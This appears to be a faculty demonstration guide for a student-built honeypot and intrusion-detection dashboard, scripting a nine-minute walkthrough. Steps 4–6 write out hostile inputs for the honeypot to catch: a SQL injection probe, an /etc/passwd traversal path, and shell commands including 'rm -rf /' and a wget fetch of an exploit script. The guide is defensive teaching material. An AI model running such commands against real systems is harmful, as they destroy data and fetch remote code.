# Honeypot Nexus — Faculty Demonstration Guide

This guide details the exact, step-by-step presentation script for demonstrating **Honeypot Nexus (Honeypot-Based Intrusion Detection & Live Attack Visualization Dashboard)** to faculty, examiners, and evaluators.

---

## 1. Pre-Flight Preparation (2 Minutes Before Demo)

1. Ensure Python dependencies are installed and database is seeded:
   ```bash
   python scripts/init_demo_admin.py
   ```
2. Start the unified application runtime:
   ```bash
   python run.py
   ```
   *Terminal will output:*
   ```text
   [*] Public Honeypot online:  http://127.0.0.1:8080
   [*] Private SOC Dashboard:  http://127.0.0.1:5000
   [*] System Mode: DEMO_MODE=ENABLED
   ```

3. **Browser Setup (Dual Window Layout):**
   - **Left Window:** Private SOC Dashboard at `http://127.0.0.1:5000`
   - **Right Window:** Public Honeypot at `http://127.0.0.1:8080`

---

## 2. Live Demonstration Script (9 Minutes)

### Step 1: SOC Operator Authentication & MFA (Minute 0:00–1:00)
1. In the **Left Window** (`http://127.0.0.1:5000/auth/login`), show the Operator Login:
   - **Username:** `admin`
   - **Password:** `AdminPassword123!`
2. Click **Proceed to MFA Verification**.
3. On the TOTP Verification prompt, enter the current 6-digit code from your authenticator app (or if using the seeded test key `JBSWY3DPEHPK3PXP`, generate code or use PyOTP).
4. Point out to evaluators:
   > *"Authentication uses Argon2id password hashing, sliding session timeouts, account lockout after 5 failures, and strict RFC 6238 TOTP replay protection."*

---

### Step 2: Architecture & Public Honeypot Deception Layer (Minute 1:00–2:30)
1. Switch to the **Right Window** (`http://127.0.0.1:8080`):
   - Point out **SecureCorp Inc.** corporate portal look-and-feel.
   - Show the bottom banner: *"Demonstration Environment — all data is synthetic."*
2. Emphasize Layer 1 Isolation:
   > *"The public honeypot on port 8080 is completely untrusted. It has zero database connection, zero ORM imports, and zero ability to execute OS commands. It communicates only outwards via an HMAC-signed EventBus facade."*

---

### Step 3: Interactive Brute-Force & Credential Attack (Minute 2:30–3:30)
1. In the Honeypot window, navigate to `http://127.0.0.1:8080/login`.
2. Enter incorrect credentials 5 times using 3 different usernames (e.g. `admin`, `jsmith`, `root` with wrong passwords).
3. Switch gaze to the **SOC Dashboard (Left Window)**:
   - Point to the **Live Attack Stream**: events insert dynamically in real time without refreshing!
   - Point to the toast alert: **Brute Force Authentication** / **Password Spraying**.
   - Show the **Threat Pulse** elevating and **Average Session Risk** updating.
4. Click on one of the stream rows to open the **Event Inspection Drawer**:
   - Point out that **passwords are never logged or stored in plaintext** — only an HMAC-derived fingerprint is retained to preserve analyst safety.

---

### Step 4: SQL Injection Simulation (Minute 3:30–4:30)
1. In the Honeypot window, open the Database Viewer at `http://127.0.0.1:8080/database`.
2. In the query box, submit a classic SQL injection probe:
   ```sql
   ' UNION SELECT username,password FROM users--
   ```
3. Show the response: Safe synthetic results are returned by in-memory Python filtering — **zero SQL queries are executed against any real database engine**.
4. In the SOC Dashboard (Left Window):
   - Watch the **SQL Injection** detection fire (+30 points).
   - Point out the **CRITICAL** severity escalation alert.

---

### Step 5: Directory Traversal & Sensitive File Access (Minute 4:30–5:30)
1. In the Honeypot window, open `http://127.0.0.1:8080/files`.
2. Click on `/security/api_keys_backup.txt` and `/backups/database_backup.sql`.
3. Try a directory traversal path:
   ```text
   http://127.0.0.1:8080/files/view?path=../../etc/passwd
   ```
4. Show that the simulated file manager returns synthetic canary content (`HNX-FAKE-...`) and the traversal rule triggers instantly in the SOC.

---

### Step 6: Safe Controlled Terminal Shell (Minute 5:30–6:30)
1. In the Honeypot window, open the Web Terminal at `http://127.0.0.1:8080/shell`.
2. Run benign recon commands:
   ```bash
   whoami
   id
   uname -a
   pwd
   ls -la
   cat /etc/passwd
   ```
3. Type hostile commands:
   ```bash
   rm -rf /
   wget http://example.invalid/exploit.sh
   sudo su -
   ```
4. Point out to evaluators:
   > *"Notice that hostile commands output safe emulated responses ('Operation not permitted', 'Network unreachable'). The shell is a pure in-memory lookup simulator. No subprocess, eval, or OS execution exists."*
5. In the SOC, show the **Shell Command Reconnaissance** detection and timeline update.

---

### Step 7: Incident Triage & Attacker Investigation (Minute 6:30–7:30)
1. In the SOC Dashboard, navigate to **Alerts** (`/dashboard/alerts`):
   - Show the status workflow: Click **Acknowledge**, then **Resolve**.
2. Navigate to **Attacker Profiles** (`/dashboard/attackers`):
   - Click on the active attacker IP.
   - Show the complete **Dossier**: Geographic attribution, ASN, ISP, VPN/Tor flags, peak risk, and the correlated attack timeline.
3. Navigate to **Sessions** (`/dashboard/sessions`):
   - Click the active session to open **Session Investigation**.
   - Show the **Explainable Scoring Breakdown**: Every single point is mathematically accounted for.

---

### Step 8: Multi-Stage Attack Simulation Engine (Minute 7:30–8:30)
1. In the top bar, click **⚡ Attack Simulation Controls**.
2. Click **🚀 Run Full Attack Scenario**:
   - The engine automatically executes a multi-stage intrusion over local loopback: Recon &rarr; Brute Force &rarr; SQLi &rarr; Traversal &rarr; Shell Recon.
3. Show the live dashboard:
   - Attack timeline chart updates with stacked severity bars.
   - Attack distribution doughnut updates.
   - Geographic Attack Map renders markers across world coordinates.
   - Threat Pulse hits **CRITICAL (100/100)**.

---

### Step 9: Report Generation & System Health (Minute 8:30–9:00)
1. Navigate to **Reports** (`/dashboard/reports`):
   - Click **Generate & Download PDF**: Open the generated branded PDF threat report.
   - Show the executive summary, KPI tables, attack distribution, and ethics disclaimer.
2. Navigate to **System Health** (`/dashboard/health`):
   - Show live CPU, Memory, and Storage gauges (sampled via `psutil`).
   - Show EventBus telemetry (Queue depth, Processed events, Lag ms).
3. Conclude the demonstration:
   > *"Honeypot Nexus provides an end-to-end, highly secure defensive deception pipeline that captures, analyzes, scores, and visualizes live cyber attacks with complete mathematical transparency and operator safety."*

---

## 3. Evaluation Quick Reference Q&A

- **Q: Can an attacker break out of the honeypot into the host machine?**
  - **A:** Impossible. The honeypot layer has zero OS execution calls (`subprocess`, `os.system`, `eval`), zero real filesystem access beyond static templates, and zero database credentials. Enforced by automated AST tests in `scripts/check_isolation.py`.
- **Q: Are real passwords stored?**
  - **A:** Never. Passwords exist only ephemerally in-memory and are hashed into HMAC fingerprints immediately to detect credential spraying while protecting analyst privacy.
- **Q: Is the dashboard real or simulated numbers?**
  - **A:** 100% real. Every card, table, chart, and map marker is calculated directly from the SQLite database and updated via WebSocket events emitted by the processing pipeline.
